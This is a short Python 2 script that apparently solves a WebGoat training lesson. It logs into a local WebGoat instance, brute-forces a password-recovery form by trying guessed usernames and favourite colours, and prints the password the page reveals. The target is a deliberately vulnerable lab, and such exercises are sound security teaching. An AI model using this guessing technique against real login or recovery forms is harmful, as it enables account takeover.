import requests
import json

url = "http://127.0.0.1:8080/WebGoat"
valSpace = 18  #distance between value and acutal password
url1 = url + "/start.mvc"
lessonURL = url + "/service/lessonmenu.mvc"

headers = headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36'
}
payload = dict(username='guest', password='guest')
s = requests.Session()
s.get(url)
s.post(url + "/j_spring_security_check;jsessionid=" + s.cookies.get('JSESSIONID'),data=payload, headers = headers)
r = s.get(url1)
#print r.content
r1 = s.get(lessonURL) #contains screen# and menu# for attack URL

parsed_json = json.loads(r1.content)

attackURL = url  + "/"  + parsed_json[4]['children'][1]['link']


#print "\n\n" + attackURL + "\n\n"

usernames = ("bob", "ted", "dylan", "rob", "jeff", "admin")
a_user = "admin"
colors = ("orange", "yellow", "red", "blue", "black", "purple", "green")
a_color = "green"
got_it = False
for u in usernames:
	fun = {"Username": u}
       	r2 = s.post(attackURL,data=fun)
	# make the request here for the username
        if "name='Color'"  in r2.text: # test if request is good here
        	for c in colors:        
	        	happy = {"Color": c}
		        r2 = s.post(attackURL,data=happy) 
			# make the request here for the color
                        if "For security reasons" in r2.text: # test if request is good here
                                got_it = True
				value = int(r2.text.index("<tr><td>Password: "))
				value = value + valSpace
				endVal = int(r2.text.index("</td></tr></table>"))
				print "username=" + u, ", color=" + c, ", password=" + r2.text[value:endVal] 
if not got_it:
        print "none found"
